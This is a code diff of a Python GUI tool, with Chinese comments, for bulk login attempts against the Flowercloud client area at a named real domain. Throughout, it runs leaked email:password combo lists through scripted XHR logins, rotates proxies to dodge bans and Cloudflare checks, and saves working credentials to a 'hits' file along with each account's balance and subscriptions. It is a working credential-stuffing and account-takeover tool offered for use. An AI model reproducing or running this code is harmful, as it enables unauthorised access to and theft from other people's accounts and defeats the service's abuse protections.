@@ -1,739 +1,831 @@
+# -*- coding: utf-8 -*-
 """
-huayun_login.py - 花云批量登录 GUI 多代理版本
-功能：
-- CustomTkinter GUI 界面
-- 代理存活检测（调用 proxy_checker）
-- 自动启动多 Chrome 实例
-- 代理轮换逻辑（每28条 combo 换IP）
-- combo 自动分割分配给多线程
+============================================================
+  花云批量登录 - 多代理多窗口版 (DrissionPage + XHR)
+  基于浪人单窗口版改写为多窗口并发版
+============================================================
+  每个窗口独立Chrome + 独立代理 + 独立Cookie
+  每个IP跑30条combo后换IP
+  被ban自动等180s + 刷新过盾
+  combo不重复 (队列分发)
+============================================================
 """
-
-import os
 import sys
+import os
 import time
+import random
+import re
 import threading
 import queue
-import math
-import json
-import tempfile
-import shutil
-from typing import List, Optional
-from dataclasses import dataclass, field
+import gc
 
-import customtkinter as ctk
-from tkinter import filedialog, messagebox
-import tkinter as tk
+try:
+    from DrissionPage import ChromiumPage, ChromiumOptions
+except ImportError:
+    print("[!] pip install DrissionPage")
+    sys.exit(1)
 
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import (
-    TimeoutException, NoSuchElementException, WebDriverException
-)
+try:
+    import customtkinter as ctk
+    from tkinter import filedialog, messagebox
+    HAS_GUI = True
+except ImportError:
+    HAS_GUI = False
 
 from proxy_checker import (
-    Proxy, parse_proxy_line, load_proxies_from_file,
-    check_proxies_batch, check_proxy
+    Proxy, load_proxies_from_file, check_proxies_batch
 )
 
+# ============ 配置 ============
+TARGET_BASE = "https://api-flowercloud.com"
+TARGET_PAGE = TARGET_BASE + "/clientarea.php"
+LOGOUT_URL = TARGET_BASE + "/logout.php"
 
-# ============================================================
-# 配置常量
-# ============================================================
-HUAYUN_LOGIN_URL = "https://www.huayun.com/login"  # 花云登录页面URL（按实际修改）
-COMBO_PER_PROXY = 28  # 每个代理处理的 combo 数量
-MAX_THREADS = 5  # 默认最大并发 Chrome 数量
-CHECK_TIMEOUT = 10  # 代理检测超时(秒)
-LOGIN_TIMEOUT = 30  # 登录页面加载超时(秒)
+COMBO_FILE = "combo_f.txt"
+PROXY_FILE = "alive_proxies.txt"
+GOOD_FILE = "hits.txt"
+PROGRESS_FILE = "progress.txt"
 
+COMBO_PER_IP = 30           # 每个IP跑多少条combo
+DELAY_PER_REQ = 2.0        # 每条间隔
+BAN_WAIT = 180              # 被封等待秒数
+CF_WAIT_MAX = 180           # 过盾最大等待
+TOKEN_REFRESH_EVERY = 25    # 每N条刷新token
+MAX_WORKERS = 3             # 默认并发窗口数
+BASE_PORT = 9300            # Chrome起始端口
 
-# ============================================================
-# Combo 分割器
-# ============================================================
-def load_combo_file(filepath: str) -> List[tuple]:
-    """加载 combo 文件，返回 [(email, password), ...]"""
-    combos = []
+BANNER = r"""
+============================================================
+  花云批量登录 - 多代理多窗口版
+  每窗口独立Chrome+代理 | XHR登录 | 自动换IP
+============================================================
+"""
+
+# ============ 工具函数 ============
+def load_progress():
+    if os.path.exists(PROGRESS_FILE):
+        try:
+            with open(PROGRESS_FILE, "r") as f:
+                c = f.read().strip()
+                if c.isdigit():
+                    return int(c)
+        except Exception:
+            pass
+    return 0
+
+def save_progress(index):
+    with open(PROGRESS_FILE, "w") as f:
+        f.write(str(index))
+
+def save_result(filename, content):
+    with open(filename, "a", encoding="utf-8") as f:
+        f.write(content + "\n")
+
+def page_is_ready(page):
     try:
-        with open(filepath, "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    combos.append((parts[0].strip(), parts[1].strip()))
-                elif "\t" in line:
-                    parts = line.split("\t", 1)
-                    combos.append((parts[0].strip(), parts[1].strip()))
-    except FileNotFoundError:
-        pass
+        return len(page.html) > 10000
+    except Exception:
+        return False
+
+def is_banned(page):
+    try:
+        html = page.html
+        if len(html) < 3000:
+            h = html.lower()
+            if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
+                return True
+        return False
+    except Exception:
+        return False
+
+def has_login_form(page):
+    try:
+        return page.run_js(
+            "return !!(document.querySelector('#inputEmail') || "
+            "document.querySelector('input[name=\"username\"]') || "
+            "document.querySelector('input[type=\"email\"]'))"
+        )
+    except Exception:
+        return False
+
+def is_logged_in(page):
+    try:
+        return "logout.php" in page.html.lower()
+    except Exception:
+        return False
+
+def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
+    start = time.time()
+    while time.time() - start < max_wait:
+        if page_is_ready(page):
+            return True
+        if is_banned(page):
+            return False
+        time.sleep(3)
+    return page_is_ready(page)
+
+def logout_force(page):
+    try:
+        page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
     except Exception:
         pass
-    return combos
+    time.sleep(0.5)
 
+def reload_form_silent(page):
+    js = """
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/clientarea.php', false);
+        xhr.send();
+        if(xhr.status === 403 || xhr.status === 429) return 'banned';
+        var html = xhr.responseText || '';
+        var m = html.match(/name="token"\\s*value="([^"]+)"/);
+        if(!m) m = html.match(/name='token'\\s*value='([^']+)'/);
+        if(m && m[1]) {
+            var el = document.querySelector('input[name="token"]');
+            if(el) { el.value = m[1]; }
+            return 'ok';
+        }
+        return 'no_token';
+    } catch(e) { return 'error'; }
+    """
+    try:
+        return page.run_js(js) == "ok"
+    except Exception:
+        return False
 
-def split_combos(combos: List[tuple], chunk_size: int = COMBO_PER_PROXY) -> List[List[tuple]]:
-    """将 combo 按 chunk_size 分割"""
-    chunks = []
-    for i in range(0, len(combos), chunk_size):
-        chunks.append(combos[i:i + chunk_size])
-    return chunks
+def do_login_xhr(page, email, password):
+    js = """
+    var token = '';
+    var tokenEl = document.querySelector('input[name="token"]');
+    if(tokenEl) token = tokenEl.value;
+    if(!token) { var cv = (typeof csrfToken !== 'undefined') ? csrfToken : ''; token = cv; }
+    if(!token) {
+        try {
+            var pre = new XMLHttpRequest();
+            pre.open('GET', '/clientarea.php', false);
+            pre.send();
+            if(pre.status === 403 || pre.status === 429) return 'banned:pre';
+            var preHtml = pre.responseText || '';
+            if(preHtml.indexOf('logout.php') !== -1) return 'need_logout';
+            var tm = preHtml.match(/name="token"\\s*value="([^"]+)"/);
+            if(!tm) tm = preHtml.match(/name='token'\\s*value='([^']+)'/);
+            if(tm && tm[1]) { token = tm[1]; if(tokenEl) tokenEl.value = token; }
+        } catch(e) {}
+    }
+    if(!token) return 'error:no_token';
+    var body = 'token=' + encodeURIComponent(token) + '&username=' + encodeURIComponent(arguments[0]) + '&password=' + encodeURIComponent(arguments[1]);
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/dologin.php', false);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send(body);
+        var status = xhr.status;
+        if(status === 403 || status === 429) return 'banned:' + status;
+        var html = xhr.responseText || '';
+        var url = xhr.responseURL || '';
+        if(url.indexOf('incorrect') !== -1) return 'bad';
+        if(html.indexOf('incorrect') !== -1) return 'bad';
+        if(html.indexOf('logout.php') !== -1) return 'good:' + html.substring(0, 15000);
+        return 'bad';
+    } catch(e) { return 'error:' + e.message; }
+    """
+    try:
+        return page.run_js(js, email, password)
+    except Exception:
+        return "js_error"
+
+def extract_info_from_html(html):
+    info = {"balance": "unknown", "services": "0", "products": []}
+    try:
+        m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
+        if m:
+            info["balance"] = m.group(1).strip()
+        m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
+        if m:
+            info["services"] = m.group(1)
+        products = re.findall(
+            r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
+        for pid, pname in products:
+            expire = "unknown"
+            em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
+            if em:
+                expire = em.group(1)
+            info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
+    except Exception:
+        pass
+    return info
+
+def format_info(info):
+    parts = ["balance=" + info["balance"], "services=" + info["services"]]
+    for p in info["products"]:
+        parts.append(p["name"] + "(id=" + p["id"] + ",exp=" + p["expire"] + ")")
+    return " | ".join(parts)
+
 
 
 # ============================================================
-# Chrome 浏览器管理
+# 单窗口Worker - 每个窗口独立Chrome + 代理
 # ============================================================
-class ChromeWorker:
-    """单个 Chrome 工作线程管理"""
+class WindowWorker:
+    """独立窗口工作器：自己的Chrome、代理、Cookie"""
 
-    def __init__(self, worker_id: int, proxy: Optional[Proxy] = None):
+    def __init__(self, worker_id, proxy_list, combo_queue, result_lock,
+                 stats, log_func=None, headless=False):
         self.worker_id = worker_id
-        self.proxy = proxy
-        self.driver = None
-        self.profile_dir = None
+        self.proxy_list = proxy_list  # 分配给此worker的代理列表
+        self.combo_queue = combo_queue  # 共享combo队列
+        self.result_lock = result_lock
+        self.stats = stats  # 共享统计 dict
+        self.log_func = log_func
+        self.headless = headless
+        self.page = None
+        self.port = BASE_PORT + worker_id
+        self.current_proxy_idx = 0
+        self.running = True
+        self.combo_count_on_ip = 0  # 当前IP已跑条数
 
-    def start_browser(self) -> bool:
-        """启动带代理的 Chrome"""
+    def log(self, msg):
+        full_msg = f"[W{self.worker_id}] {msg}"
+        if self.log_func:
+            self.log_func(full_msg)
+        else:
+            print(full_msg, flush=True)
+
+    def get_current_proxy(self):
+        if not self.proxy_list:
+            return None
+        return self.proxy_list[self.current_proxy_idx % len(self.proxy_list)]
+
+    def switch_proxy(self):
+        """切换到下一个代理"""
+        self.current_proxy_idx += 1
+        self.combo_count_on_ip = 0
+        proxy = self.get_current_proxy()
+        self.log(f"换IP -> {proxy.to_url() if proxy else '直连'}")
+        # 需要重启浏览器来切换代理
+        self.close_browser()
+        time.sleep(2)
+        return self.start_browser()
+
+    def start_browser(self):
+        """启动带代理的Chrome"""
+        self.close_browser()
         try:
-            options = Options()
+            co = ChromiumOptions()
+            co.set_local_port(self.port)
+            co.set_argument('--no-first-run')
+            co.set_argument('--no-default-browser-check')
+            co.set_argument('--disable-infobars')
+            co.set_argument('--disable-extensions')
+            co.set_argument('--disable-gpu')
+            co.set_argument('--disable-dev-shm-usage')
+            co.set_argument('--no-sandbox')
+            co.set_argument('--disable-background-networking')
+            co.set_argument('--disable-sync')
+            co.set_argument('--disable-translate')
 
-            # 创建独立的用户数据目录
-            self.profile_dir = tempfile.mkdtemp(prefix=f"huayun_chrome_{self.worker_id}_")
-
-            options.add_argument(f"--user-data-dir={self.profile_dir}")
-            options.add_argument("--no-first-run")
-            options.add_argument("--no-default-browser-check")
-            options.add_argument("--disable-blink-features=AutomationControlled")
-            options.add_argument("--disable-infobars")
-            options.add_argument("--disable-extensions")
-            options.add_argument("--disable-gpu")
-            options.add_argument("--disable-dev-shm-usage")
-            options.add_argument("--no-sandbox")
-            options.add_experimental_option("excludeSwitches", ["enable-automation"])
-            options.add_experimental_option("useAutomationExtension", False)
+            if self.headless:
+                co.set_argument('--headless=new')
 
             # 设置代理
-            if self.proxy:
-                proxy_arg = self.proxy.to_selenium_arg()
-                options.add_argument(f"--proxy-server={proxy_arg}")
+            proxy = self.get_current_proxy()
+            if proxy:
+                proxy_str = proxy.to_selenium_arg()
+                co.set_argument(f'--proxy-server={proxy_str}')
+                self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url()}")
+            else:
+                self.log(f"启动Chrome 端口{self.port} 无代理")
 
-            self.driver = webdriver.Chrome(options=options)
-            self.driver.set_page_load_timeout(LOGIN_TIMEOUT)
+            self.page = ChromiumPage(co)
             return True
         except Exception as e:
-            print(f"[Worker-{self.worker_id}] Chrome 启动失败: {e}")
+            self.log(f"Chrome启动失败: {e}")
             return False
 
-    def login(self, email: str, password: str) -> dict:
-        """
-        执行单次登录尝试
-        返回: {"email": ..., "password": ..., "status": "success"/"failed"/"error", "msg": ...}
-        """
-        result = {
-            "email": email,
-            "password": password,
-            "status": "error",
-            "msg": ""
-        }
-
-        if not self.driver:
-            result["msg"] = "浏览器未启动"
-            return result
-
+    def close_browser(self):
+        """关闭浏览器"""
         try:
-            self.driver.get(HUAYUN_LOGIN_URL)
-            time.sleep(2)
+            if self.page:
+                self.page.quit()
+        except Exception:
+            pass
+        self.page = None
+        gc.collect()
 
-            # 等待登录表单加载 - 根据实际页面调整选择器
-            WebDriverWait(self.driver, LOGIN_TIMEOUT).until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'], input[name='email'], input[name='username'], #email, #username"))
-            )
+    def init_page(self):
+        """打开目标页面并等待过盾"""
+        if not self.page:
+            return False
+        try:
+            self.page.get(TARGET_PAGE)
+            time.sleep(5)
 
-            # 查找用户名/邮箱输入框
-            email_input = None
-            for selector in ["input[name='email']", "input[name='username']", "#email", "#username", "input[type='text']"]:
-                try:
-                    email_input = self.driver.find_element(By.CSS_SELECTOR, selector)
-                    if email_input:
-                        break
-                except NoSuchElementException:
-                    continue
+            if is_banned(self.page):
+                self.log("首次加载被封,等待...")
+                return False
 
-            # 查找密码输入框
-            pass_input = None
-            for selector in ["input[name='password']", "#password", "input[type='password']"]:
-                try:
-                    pass_input = self.driver.find_element(By.CSS_SELECTOR, selector)
-                    if pass_input:
-                        break
-                except NoSuchElementException:
-                    continue
+            if not page_is_ready(self.page):
+                self.log("等待过盾...")
+                if not wait_cf_pass(self.page, CF_WAIT_MAX):
+                    self.log("过盾失败")
+                    return False
 
-            if not email_input or not pass_input:
-                result["msg"] = "找不到登录表单"
-                result["status"] = "error"
-                return result
+            if is_logged_in(self.page):
+                logout_force(self.page)
+                time.sleep(1)
 
-            # 清空并输入
-            email_input.clear()
-            email_input.send_keys(email)
-            time.sleep(0.3)
+            if has_login_form(self.page) or reload_form_silent(self.page):
+                self.log("页面就绪!")
+                return True
 
-            pass_input.clear()
-            pass_input.send_keys(password)
-            time.sleep(0.3)
-
-            # 查找并点击登录按钮
-            login_btn = None
-            for selector in [
-                "button[type='submit']",
-                "input[type='submit']",
-                "button:contains('登录')",
-                ".login-btn",
-                "#login-btn",
-                "button.btn-primary"
-            ]:
-                try:
-                    login_btn = self.driver.find_element(By.CSS_SELECTOR, selector)
-                    if login_btn:
-                        break
-                except NoSuchElementException:
-                    continue
-
-            if not login_btn:
-                # 尝试 XPath
-                try:
-                    login_btn = self.driver.find_element(
-                        By.XPATH, "//button[contains(text(),'登录') or contains(text(),'Login')]"
-                    )
-                except NoSuchElementException:
-                    pass
-
-            if login_btn:
-                login_btn.click()
-            else:
-                result["msg"] = "找不到登录按钮"
-                result["status"] = "error"
-                return result
-
-            time.sleep(3)
-
-            # 判断登录结果 - 根据实际页面调整
-            current_url = self.driver.current_url
-            page_source = self.driver.page_source.lower()
-
-            if "dashboard" in current_url or "home" in current_url or "panel" in current_url:
-                result["status"] = "success"
-                result["msg"] = "登录成功"
-            elif "密码错误" in page_source or "password" in page_source and "error" in page_source:
-                result["status"] = "failed"
-                result["msg"] = "密码错误"
-            elif "账号不存在" in page_source or "not found" in page_source:
-                result["status"] = "failed"
-                result["msg"] = "账号不存在"
-            elif "login" in current_url:
-                result["status"] = "failed"
-                result["msg"] = "登录失败(仍在登录页)"
-            else:
-                result["status"] = "success"
-                result["msg"] = "可能成功(URL变化)"
-
-            return result
-
-        except TimeoutException:
-            result["msg"] = "页面加载超时"
-            result["status"] = "error"
-            return result
-        except WebDriverException as e:
-            result["msg"] = f"浏览器异常: {str(e)[:50]}"
-            result["status"] = "error"
-            return result
+            self.log("无法获取登录表单")
+            return False
         except Exception as e:
-            result["msg"] = f"未知错误: {str(e)[:50]}"
-            result["status"] = "error"
-            return result
+            self.log(f"init_page异常: {e}")
+            return False
 
-    def close(self):
-        """关闭浏览器并清理"""
-        try:
-            if self.driver:
-                self.driver.quit()
-                self.driver = None
-        except Exception:
-            pass
-        try:
-            if self.profile_dir and os.path.exists(self.profile_dir):
-                shutil.rmtree(self.profile_dir, ignore_errors=True)
-        except Exception:
-            pass
+    def handle_ban(self):
+        """处理被封：等180s + 换IP + 刷新"""
+        self.log(f"被封! 等待{BAN_WAIT}s后换IP...")
+        with self.result_lock:
+            self.stats["bans"] += 1
 
+        # 等待
+        waited = 0
+        while waited < BAN_WAIT and self.running:
+            chunk = min(30, BAN_WAIT - waited)
+            time.sleep(chunk)
+            waited += chunk
+            remaining = BAN_WAIT - waited
+            if remaining > 0:
+                self.log(f"  等待中...剩{remaining}s")
 
+        if not self.running:
+            return False
 
-# ============================================================
-# 任务调度引擎
-# ============================================================
-class TaskEngine:
-    """多线程任务调度，管理代理轮换和 combo 分配"""
+        # 换IP
+        if not self.switch_proxy():
+            self.log("换IP后启动失败")
+            return False
 
-    def __init__(self, proxies: List[Proxy], combos: List[tuple],
-                 max_threads: int = MAX_THREADS,
-                 combo_per_proxy: int = COMBO_PER_PROXY,
-                 log_callback=None,
-                 progress_callback=None,
-                 result_callback=None):
-        self.proxies = proxies
-        self.combos = combos
-        self.max_threads = max_threads
-        self.combo_per_proxy = combo_per_proxy
-        self.log_callback = log_callback
-        self.progress_callback = progress_callback
-        self.result_callback = result_callback
+        # 重新打开页面
+        return self.init_page()
 
-        self.running = False
-        self.paused = False
-        self.lock = threading.Lock()
-        self.threads: List[threading.Thread] = []
+    def run(self):
+        """主循环：从队列取combo，登录，处理结果"""
+        # 启动浏览器
+        if not self.start_browser():
+            self.log("启动失败,退出")
+            return
 
-        # 统计
-        self.total = len(combos)
-        self.processed = 0
-        self.success_count = 0
-        self.failed_count = 0
-        self.error_count = 0
+        # 初始化页面
+        if not self.init_page():
+            # 尝试换IP
+            if not self.switch_proxy() or not self.init_page():
+                self.log("初始化失败,退出")
+                self.close_browser()
+                return
 
-        # 结果存储
-        self.results_success = []
-        self.results_failed = []
+        batch_count = 0
 
-    def log(self, msg: str):
-        if self.log_callback:
-            self.log_callback(msg)
-        else:
-            print(msg)
-
-    def start(self):
-        """启动任务"""
-        self.running = True
-        self.paused = False
-
-        # 分割 combo 为多个 chunk
-        chunks = split_combos(self.combos, self.combo_per_proxy)
-        self.log(f"[引擎] 总计 {self.total} 条 combo, 分为 {len(chunks)} 组 (每组 {self.combo_per_proxy} 条)")
-        self.log(f"[引擎] 可用代理: {len(self.proxies)} 个, 并发线程: {self.max_threads}")
-
-        # 创建任务队列
-        task_queue = queue.Queue()
-        for i, chunk in enumerate(chunks):
-            proxy_idx = i % len(self.proxies) if self.proxies else 0
-            proxy = self.proxies[proxy_idx] if self.proxies else None
-            task_queue.put((chunk, proxy, i))
-
-        # 启动工作线程
-        for tid in range(min(self.max_threads, task_queue.qsize())):
-            t = threading.Thread(
-                target=self._worker_thread,
-                args=(tid, task_queue),
-                daemon=True
-            )
-            self.threads.append(t)
-            t.start()
-
-        # 启动监控线程
-        monitor = threading.Thread(target=self._monitor_thread, daemon=True)
-        monitor.start()
-
-    def stop(self):
-        """停止任务"""
-        self.running = False
-        self.log("[引擎] 正在停止...")
-
-    def pause(self):
-        """暂停/恢复"""
-        self.paused = not self.paused
-        state = "暂停" if self.paused else "恢复"
-        self.log(f"[引擎] 任务已{state}")
-
-    def _worker_thread(self, tid: int, task_queue: queue.Queue):
-        """工作线程：从队列取任务执行"""
         while self.running:
+            # 从队列取combo
             try:
-                chunk, proxy, chunk_idx = task_queue.get_nowait()
+                idx, email, password = self.combo_queue.get_nowait()
             except queue.Empty:
                 break
 
-            proxy_info = proxy.to_url() if proxy else "无代理(直连)"
-            self.log(f"[线程-{tid}] 开始处理第 {chunk_idx + 1} 组 ({len(chunk)}条), 代理: {proxy_info}")
+            # 检查是否需要换IP
+            if self.combo_count_on_ip >= COMBO_PER_IP:
+                self.log(f"已跑{self.combo_count_on_ip}条,换IP...")
+                if not self.switch_proxy() or not self.init_page():
+                    # 换IP失败,放回队列
+                    self.combo_queue.put((idx, email, password))
+                    time.sleep(10)
+                    continue
 
-            # 启动浏览器
-            worker = ChromeWorker(worker_id=tid, proxy=proxy)
-            if not worker.start_browser():
-                self.log(f"[线程-{tid}] Chrome 启动失败, 跳过本组")
-                with self.lock:
-                    self.error_count += len(chunk)
-                    self.processed += len(chunk)
-                self._update_progress()
-                continue
+            # 每TOKEN_REFRESH_EVERY条刷新token
+            if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
+                if not reload_form_silent(self.page):
+                    # 尝试刷新页面
+                    self.page.get(TARGET_PAGE)
+                    time.sleep(5)
+                    if not page_is_ready(self.page):
+                        wait_cf_pass(self.page, 60)
+                    if is_logged_in(self.page):
+                        logout_force(self.page)
+                        time.sleep(1)
 
-            # 逐条登录
-            for email, password in chunk:
-                if not self.running:
+            # 执行登录
+            result = do_login_xhr(self.page, email, password)
+
+            # 处理登录残留
+            if result == "need_logout":
+                logout_force(self.page)
+                time.sleep(1)
+                reload_form_silent(self.page)
+                result = do_login_xhr(self.page, email, password)
+
+            # 处理被封
+            if isinstance(result, str) and result.startswith("banned:"):
+                self.log(f"[{idx+1}] {email} -> BANNED!")
+                if not self.handle_ban():
+                    self.combo_queue.put((idx, email, password))
                     break
+                # 解封后重试
+                result = do_login_xhr(self.page, email, password)
+                if result == "need_logout":
+                    logout_force(self.page)
+                    time.sleep(1)
+                    reload_form_silent(self.page)
+                    result = do_login_xhr(self.page, email, password)
+                if isinstance(result, str) and result.startswith("banned:"):
+                    self.log("重试仍封,放回队列")
+                    self.combo_queue.put((idx, email, password))
+                    if not self.handle_ban():
+                        break
+                    continue
 
-                while self.paused and self.running:
-                    time.sleep(0.5)
+            # 处理结果
+            self.combo_count_on_ip += 1
+            batch_count += 1
 
-                result = worker.login(email, password)
+            with self.result_lock:
+                self.stats["processed"] += 1
 
-                with self.lock:
-                    self.processed += 1
-                    if result["status"] == "success":
-                        self.success_count += 1
-                        self.results_success.append(result)
-                        self.log(f"  ✓ [{self.processed}/{self.total}] {email} -> 成功")
-                    elif result["status"] == "failed":
-                        self.failed_count += 1
-                        self.results_failed.append(result)
-                        self.log(f"  ✗ [{self.processed}/{self.total}] {email} -> {result['msg']}")
-                    else:
-                        self.error_count += 1
-                        self.log(f"  ! [{self.processed}/{self.total}] {email} -> {result['msg']}")
+                if isinstance(result, str) and result.startswith("good:"):
+                    self.stats["hits"] += 1
+                    html = result[5:]
+                    info = extract_info_from_html(html)
+                    svc = int(info["services"]) if info["services"].isdigit() else 0
+                    tag = f"HIT[SUB={info['services']}]" if svc > 0 else "HIT[NOSUB]"
+                    self.log(f"[{idx+1}] {email} -> {tag} {info['balance']}")
+                    if info["products"]:
+                        for p in info["products"]:
+                            self.log(f"    -> {p['name']} exp:{p['expire']}")
+                    save_result(GOOD_FILE, f"{email}:{password} | {format_info(info)}")
 
-                if self.result_callback:
-                    self.result_callback(result)
-                self._update_progress()
+                    # 登出
+                    logout_force(self.page)
+                    time.sleep(1)
+                    reload_form_silent(self.page)
 
-                time.sleep(1)  # 防止请求过快
+                elif result == "bad" or (isinstance(result, str) and result == "bad"):
+                    self.stats["failed"] += 1
+                    self.log(f"[{idx+1}] {email} -> 失败")
 
-            # 关闭浏览器
-            worker.close()
-            self.log(f"[线程-{tid}] 第 {chunk_idx + 1} 组完成, Chrome 已关闭")
+                elif result == "js_error" or (isinstance(result, str) and result.startswith("error:")):
+                    self.stats["errors"] += 1
+                    self.log(f"[{idx+1}] {email} -> err:{result}")
+                    if result == "error:no_token":
+                        reload_form_silent(self.page)
+                else:
+                    self.stats["errors"] += 1
+                    self.log(f"[{idx+1}] {email} -> 未知:{str(result)[:40]}")
 
-        self.log(f"[线程-{tid}] 工作线程结束")
+                # 保存进度
+                save_progress(self.stats["processed"])
 
-    def _monitor_thread(self):
-        """监控线程：等待所有工作线程完成"""
+            # 延迟
+            time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))
+
+        self.log("工作结束")
+        self.close_browser()
+
+
+
+# ============================================================
+# 多窗口调度引擎
+# ============================================================
+class MultiWindowEngine:
+    """管理多个WindowWorker的调度引擎"""
+
+    def __init__(self, proxies, combos, max_workers=MAX_WORKERS,
+                 combo_per_ip=COMBO_PER_IP, headless=False, log_func=None):
+        self.proxies = proxies
+        self.combos = combos
+        self.max_workers = max_workers
+        self.combo_per_ip = combo_per_ip
+        self.headless = headless
+        self.log_func = log_func
+
+        self.combo_queue = queue.Queue()
+        self.result_lock = threading.Lock()
+        self.stats = {
+            "processed": 0,
+            "hits": 0,
+            "failed": 0,
+            "errors": 0,
+            "bans": 0,
+            "total": len(combos)
+        }
+        self.workers = []
+        self.threads = []
+        self.running = False
+
+    def log(self, msg):
+        if self.log_func:
+            self.log_func(msg)
+        else:
+            print(msg, flush=True)
+
+    def start(self):
+        """启动所有工作窗口"""
+        self.running = True
+
+        # 填充combo队列
+        for i, (email, password) in enumerate(self.combos):
+            self.combo_queue.put((i, email, password))
+
+        self.log(f"[引擎] 总计 {len(self.combos)} 条combo")
+        self.log(f"[引擎] 代理 {len(self.proxies)} 个 | 窗口 {self.max_workers} 个")
+        self.log(f"[引擎] 每IP跑 {self.combo_per_ip} 条 | {'无头' if self.headless else '有头'}模式")
+
+        # 给每个worker分配代理(轮流分)
+        proxy_chunks = [[] for _ in range(self.max_workers)]
+        for i, proxy in enumerate(self.proxies):
+            proxy_chunks[i % self.max_workers].append(proxy)
+
+        # 启动workers
+        for wid in range(self.max_workers):
+            worker = WindowWorker(
+                worker_id=wid,
+                proxy_list=proxy_chunks[wid],
+                combo_queue=self.combo_queue,
+                result_lock=self.result_lock,
+                stats=self.stats,
+                log_func=self.log_func,
+                headless=self.headless
+            )
+            self.workers.append(worker)
+
+            t = threading.Thread(target=worker.run, daemon=True)
+            self.threads.append(t)
+            t.start()
+            time.sleep(3)  # 错开启动避免端口冲突
+
+        # 监控线程
+        monitor = threading.Thread(target=self._monitor, daemon=True)
+        monitor.start()
+
+    def stop(self):
+        """停止所有worker"""
+        self.running = False
+        for w in self.workers:
+            w.running = False
+        self.log("[引擎] 正在停止...")
+
+    def _monitor(self):
+        """监控所有线程完成"""
         for t in self.threads:
             t.join()
 
         self.running = False
-        self.log(f"\n[引擎] ========== 全部完成 ==========")
-        self.log(f"[引擎] 总计: {self.total} | 成功: {self.success_count} | 失败: {self.failed_count} | 错误: {self.error_count}")
-
-        # 保存结果
-        self._save_results()
-
-    def _update_progress(self):
-        if self.progress_callback:
-            self.progress_callback(self.processed, self.total)
-
-    def _save_results(self):
-        """保存成功和失败结果到文件"""
-        try:
-            if self.results_success:
-                with open("hits.txt", "w", encoding="utf-8") as f:
-                    for r in self.results_success:
-                        f.write(f"{r['email']}:{r['password']}\n")
-                self.log(f"[引擎] 成功结果已保存到 hits.txt ({len(self.results_success)} 条)")
-        except Exception as e:
-            self.log(f"[引擎] 保存结果失败: {e}")
-
+        s = self.stats
+        self.log("")
+        self.log("=" * 60)
+        self.log("  全部完成!")
+        self.log(f"  总计: {s['total']} | 已处理: {s['processed']}")
+        self.log(f"  击中: {s['hits']} | 失败: {s['failed']} | 错误: {s['errors']}")
+        self.log(f"  被封: {s['bans']} 次")
+        self.log("=" * 60)
 
 
 # ============================================================
-# GUI 界面 (CustomTkinter)
+# GUI 界面
 # ============================================================
-class HuaYunLoginApp(ctk.CTk):
-    """花云批量登录 GUI 主窗口"""
+class FlowerLoginApp(ctk.CTk):
+    """花云批量登录 GUI"""
 
     def __init__(self):
         super().__init__()
-
-        self.title("花云批量登录 - 多代理版 v1.0")
-        self.geometry("1000x700")
-        self.minsize(900, 600)
-
+        self.title("花云批量登录 - 多代理多窗口版 v2.0")
+        self.geometry("1050x720")
+        self.minsize(950, 620)
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("blue")
 
-        # 数据
-        self.proxies: List[Proxy] = []
-        self.alive_proxies: List[Proxy] = []
-        self.combos: List[tuple] = []
-        self.engine: Optional[TaskEngine] = None
-
+        self.proxies = []
+        self.combos = []
+        self.engine = None
         self._build_ui()
 
     def _build_ui(self):
-        """构建界面"""
-        # ===== 顶部控制面板 =====
-        top_frame = ctk.CTkFrame(self)
-        top_frame.pack(fill="x", padx=10, pady=(10, 5))
+        # 顶部
+        top = ctk.CTkFrame(self)
+        top.pack(fill="x", padx=10, pady=(10, 5))
 
-        # 第一行：文件选择
-        row1 = ctk.CTkFrame(top_frame, fg_color="transparent")
-        row1.pack(fill="x", padx=10, pady=5)
+        # Row 1: 文件
+        r1 = ctk.CTkFrame(top, fg_color="transparent")
+        r1.pack(fill="x", padx=10, pady=4)
+        ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
+        self.proxy_var = ctk.StringVar(value="alive_proxies.txt")
+        ctk.CTkEntry(r1, textvariable=self.proxy_var, width=220).pack(side="left", padx=5)
+        ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
+        ctk.CTkLabel(r1, text="Combo:").pack(side="left")
+        self.combo_var = ctk.StringVar(value="combo_f.txt")
+        ctk.CTkEntry(r1, textvariable=self.combo_var, width=220).pack(side="left", padx=5)
+        ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")
 
-        ctk.CTkLabel(row1, text="代理文件:").pack(side="left", padx=(0, 5))
-        self.proxy_path_var = ctk.StringVar(value="proxies.txt")
-        ctk.CTkEntry(row1, textvariable=self.proxy_path_var, width=250).pack(side="left", padx=(0, 5))
-        ctk.CTkButton(row1, text="浏览", width=60, command=self._browse_proxy).pack(side="left", padx=(0, 20))
+        # Row 2: 参数
